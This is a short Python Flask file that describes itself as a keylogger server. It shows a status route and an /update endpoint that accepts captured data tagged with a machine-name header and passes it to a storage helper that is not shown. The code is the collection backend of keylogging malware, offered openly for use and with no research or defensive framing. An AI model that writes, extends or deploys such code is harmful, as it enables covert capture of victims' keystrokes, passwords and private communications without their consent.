from flask import Flask, render_template, request, jsonify
import os

from flask import Flask

from services.post_service import data_to_memo


app = Flask(__name__)


@app.route('/')
def home():
    return  "KeyLogger Server is Running" 



@app.route('/update', methods=['POST'])
def update():

    data = request.json
    machine_name = request.headers.get('X-Machine-Name', None)
    if not data or not machine_name:
        return jsonify({"error": "Invalid payload"}), 400
    
    data_to_memo(data,machine_name)
    return jsonify({"status": "success"}), 200



if __name__ == '__main__':
    app.run(port=5000, debug=True)

